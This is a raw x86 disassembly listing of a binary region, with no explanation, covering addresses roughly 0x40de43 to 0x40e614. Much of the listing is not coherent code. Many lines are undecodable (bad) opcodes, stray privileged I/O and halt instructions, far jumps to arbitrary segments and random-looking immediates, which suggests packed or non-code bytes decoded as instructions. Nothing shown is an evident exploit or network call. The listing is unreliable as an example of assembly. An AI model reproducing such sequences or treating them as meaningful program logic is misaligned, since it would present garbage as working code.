  40de43:	ins    BYTE PTR es:[edi],dx
  40de44:	sti    
  40de45:	ror    BYTE PTR ds:0xb70633bd,1
  40de4b:	adc    dl,0xfe
  40de4e:	pushf  
  40de4f:	mov    bh,0x90
  40de51:	or     cl,dh
  40de53:	mov    ?,WORD PTR [esi+0x17]
  40de56:	inc    edi
  40de57:	mov    esp,DWORD PTR [ebp+0x201be0d]
  40de5d:	or     al,0x70
  40de5f:	loopne 0x40de2c
  40de61:	jg     0x40de51
  40de63:	mov    WORD PTR [ebx+0x1e086411],fs
  40de69:	pop    ds
  40de6a:	pop    ebx
  40de6b:	jg     0x40de03
  40de6d:	lods   al,BYTE PTR ds:[esi]
  40de6e:	retf   
  40de6f:	cwde   
  40de70:	mov    ebp,DWORD PTR [ebx+ecx*8+0x4f]
  40de74:	jns    0x40de13
  40de76:	pop    esp
  40de77:	in     eax,0x9f
  40de79:	adc    WORD PTR [esi+0x3f9c48f9],cx
  40de80:	(bad)  [ebx-0x22c01dfa]
  40de86:	cli    
  40de87:	dec    esi
  40de88:	lds    esp,FWORD PTR [edx+ebx*8+0x8]
  40de8c:	xlat   BYTE PTR ds:[ebx]
  40de8d:	mov    DWORD PTR [eax],eax
  40de8f:	or     al,0x3
  40de91:	mov    esp,ebp
  40de93:	xor    eax,0x2cf8c8ee
  40de98:	pop    ecx
  40de99:	mov    bh,0x1b
  40de9b:	and    esp,DWORD PTR [ecx]
  40de9d:	cdq    
  40de9e:	(bad)  
  40de9f:	es sub esi,ecx
  40dea2:	xor    DWORD PTR [edi+esi*4-0x78],0xa675f9f
  40deaa:	ret    
  40deab:	mov    cl,BYTE PTR [edx]
  40dead:	adc    eax,0x8e060bcf
  40deb2:	imul   BYTE PTR [eax-0x111a5adf]
  40deb8:	mov    cl,0x9e
  40deba:	ins    BYTE PTR es:[edi],dx
  40debb:	mov    dh,0xdb
  40debd:	sub    esi,edx
  40debf:	imul   eax,DWORD PTR [edx+ecx*2+0x3a],0x3a
  40dec4:	(bad)  
  40dec5:	arpl   WORD PTR [edi+0x1a],ax
  40dec8:	mov    bl,0x5a
  40deca:	lds    esp,FWORD PTR [ebp-0x4729b95d]
  40ded0:	cli    
  40ded1:	fidivr DWORD PTR [ecx-0xe]
  40ded4:	cs mov esp,0x5a972e0
  40deda:	popa   
  40dedb:	addr16 repz xor eax,0xe785f60f
  40dee2:	cmp    BYTE PTR [eax-0x7d5efa15],ah
  40dee8:	ret    
  40dee9:	dec    eax
  40deea:	jb     0x40df37
  40deec:	pusha  
  40deed:	cmp    eax,0x829c657
  40def2:	mov    BYTE PTR [ebx+eax*2-0x7649ce9e],al
  40def9:	(bad)  
  40defa:	mov    DWORD PTR [esi-0x68],ecx
  40defd:	ficomp DWORD PTR [esi-0x700d4e1a]
  40df03:	jmp    0x40df1a
  40df05:	(bad)
  40df08:	stos   DWORD PTR es:[edi],eax
  40df09:	jnp    0x40df7c
  40df0b:	scas   eax,DWORD PTR es:[edi]
  40df0c:	call   0x5c10de37
  40df11:	out    dx,eax
  40df12:	cmp    esp,DWORD PTR [edi+0x5]
  40df15:	ds clc 
  40df17:	xchg   ebx,eax
  40df18:	dec    ebp
  40df19:	mov    ch,0xec
  40df1b:	push   edx
  40df1c:	cmp    DWORD PTR [ebp+0x3526b606],ecx
  40df22:	stos   BYTE PTR es:[edi],al
  40df23:	mov    cl,0xd
  40df25:	ds dec ebx
  40df27:	xchg   edi,eax
  40df28:	mov    dh,0x1e
  40df2a:	cmp    DWORD PTR [ebp-0x6d],eax
  40df2d:	mov    ss,WORD PTR [edi-0x31]
  40df30:	inc    esp
  40df31:	or     esp,DWORD PTR [ecx]
  40df33:	xor    al,0x8
  40df35:	xchg   edx,eax
  40df36:	test   DWORD PTR [ebx],ebp
  40df38:	popa   
  40df39:	iret   
  40df3a:	loope  0x40dfa4
  40df3c:	sbb    DWORD PTR [ebp+0x70],esp
  40df3f:	and    DWORD PTR [ecx-0x5617eee2],ecx
  40df45:	adc    DWORD PTR [edi-0x44],edi
  40df48:	xchg   edx,eax
  40df49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df4a:	jbe    0x40df45
  40df4c:	jno    0x40df15
  40df4e:	imul   ebp,ebp,0x180f5b54
  40df54:	ds mov ebp,0xfd758207
  40df5a:	shl    eax,1
  40df5c:	lock cmp eax,DWORD PTR [eax-0x58]
  40df60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df61:	push   edi
  40df62:	pushf  
  40df63:	dec    edi
  40df64:	sub    esi,ebp
  40df66:	xor    ecx,DWORD PTR gs:[edi]
  40df69:	sbb    al,0x40
  40df6b:	adc    al,BYTE PTR [ebx-0xe]
  40df6e:	in     al,dx
  40df6f:	dec    ecx
  40df70:	in     al,dx
  40df71:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40df73:	stc    
  40df74:	test   BYTE PTR [ebx],ah
  40df76:	mov    esp,0xcb87d92b
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	sar    DWORD PTR [ebp-0x78c2ec48],1
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40df3d
  40dfb4:	jae    0x40dfca
  40dfb6:	daa    
  40dfb7:	je     0x40df7e
  40dfb9:	jbe    0x40df8c
  40dfbb:	add    edi,DWORD PTR [eax-0x5]
  40dfbe:	mov    ecx,0x5e3a3a12
  40dfc3:	gs in  eax,dx
  40dfc5:	lahf   
  40dfc6:	es fdivp st(5),st
  40dfc9:	or     al,0x70
  40dfcb:	stos   BYTE PTR es:[edi],al
  40dfcc:	shl    bl,cl
  40dfce:	sub    BYTE PTR [eax],cl
  40dfd0:	es retf 
  40dfd2:	xor    DWORD PTR [edx],eax
  40dfd4:	out    0x1f,al
  40dfd6:	and    edi,DWORD PTR [edi+0x77]
  40dfd9:	cmp    cl,ch
  40dfdb:	xor    BYTE PTR ds:0xb9488ac6,ch
  40dfe1:	daa    
  40dfe2:	and    eax,0x36ec6b84
  40dfe7:	(bad)  
  40dfe9:	lods   al,BYTE PTR ds:[esi]
  40dfea:	xor    al,BYTE PTR [edi+0x790e4958]
  40dff0:	xlat   BYTE PTR fs:[ebx]
  40dff2:	inc    DWORD PTR [ebx-0x7902ca28]
  40dff8:	cmp    BYTE PTR [ecx+0x108dc4a9],cl
  40dffe:	sbb    DWORD PTR [edi],ecx
  40e000:	mov    WORD PTR [edi+0x73bbfe2a],?
  40e006:	mov    ah,0xae
  40e008:	shl    DWORD PTR [edi+0x4ad6e281],0xbb
  40e00f:	push   esi
  40e010:	mov    bh,ch
  40e012:	cmp    DWORD PTR [ecx],0x2000aeba
  40e018:	jmp    0xb93009fe
  40e01d:	test   BYTE PTR [esi+0x6e3c2b40],cl
  40e023:	fstp   DWORD PTR [ebx-0x62]
  40e026:	sbb    esi,DWORD PTR [ebx+0x59915030]
  40e02c:	push   ecx
  40e02d:	or     cl,BYTE PTR [edx+0x22cc1b4f]
  40e033:	lods   al,BYTE PTR ds:[esi]
  40e034:	imul   DWORD PTR [ebp+0x47332ad8]
  40e03a:	loope  0x40e047
  40e03c:	pop    ebp
  40e03d:	mov    edx,0xa8766e64
  40e042:	cwde   
  40e043:	mov    bl,0xc
  40e045:	bound  esp,QWORD PTR ds:0x861c1ac6
  40e04b:	out    dx,al
  40e04c:	dec    ebp
  40e04d:	scas   al,BYTE PTR es:[edi]
  40e04e:	mov    bh,bl
  40e050:	xchg   ecx,eax
  40e051:	imul   ebp,esi,0xcb5fe340
  40e057:	adc    al,0xe0
  40e059:	xchg   edi,eax
  40e05a:	or     DWORD PTR [ebp-0x4c520a6a],ebx
  40e060:	mov    bl,0x85
  40e062:	jns    0x40e0a7
  40e064:	jb     0x40e092
  40e066:	imul   eax,DWORD PTR [edi+0x75],0xaa0e3fb2
  40e06d:	pop    ebx
  40e06e:	outs   dx,DWORD PTR ds:[esi]
  40e06f:	add    eax,0x8e47d47
  40e074:	push   ds
  40e075:	cli    
  40e076:	mov    bl,0x91
  40e078:	ins    DWORD PTR es:[edi],dx
  40e079:	add    al,0x6f
  40e07b:	addr16 sbb al,0x5c
  40e07e:	pop    esp
  40e07f:	xor    al,0xe
  40e081:	and    bl,BYTE PTR [ebp-0x25342ee]
  40e087:	dec    bx
  40e089:	dec    eax
  40e08a:	lds    edx,FWORD PTR [esp+ecx*2+0x104efed8]
  40e091:	repz xchg ecx,eax
  40e093:	adc    eax,0x8fa5b76a
  40e098:	popa   
  40e099:	loopne 0x40e039
  40e09b:	cmp    eax,0x6caa881
  40e0a0:	icebp  
  40e0a1:	nop
  40e0a2:	or     DWORD PTR [edx-0x26],ebx
  40e0a5:	fcmovu st,st(0)
  40e0a7:	cld    
  40e0a8:	call   0x8fab3467
  40e0ad:	rcr    esp,cl
  40e0af:	inc    edi
  40e0b0:	hlt    
  40e0b1:	loop   0x40e0e7
  40e0b3:	pop    edi
  40e0b4:	sbb    al,0x49
  40e0b6:	and    al,ch
  40e0b8:	mov    esi,0xb7415c0a
  40e0bd:	and    al,0x8b
  40e0bf:	pushf  
  40e0c0:	mov    dl,0xcc
  40e0c2:	xchg   BYTE PTR [ecx-0x22db6a07],cl
  40e0c8:	cli    
  40e0c9:	inc    eax
  40e0ca:	add    al,0xc6
  40e0cc:	cli    
  40e0cd:	mov    bl,0x84
  40e0cf:	into   
  40e0d0:	jg     0x40e118
  40e0d2:	and    DWORD PTR [edx],0x6f
  40e0d5:	mov    bl,0x1d
  40e0d7:	push   eax
  40e0d8:	and    DWORD PTR [esi],0x3e
  40e0db:	mov    dh,0x57
  40e0dd:	mov    ecx,0x1c633d01
  40e0e2:	ss sbb al,0x59
  40e0e5:	stc    
  40e0e6:	xchg   DWORD PTR [edi-0x66904495],esp
  40e0ec:	fisttp WORD PTR ds:0x65549a4b
  40e0f2:	mov    esp,0xf4458b04
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
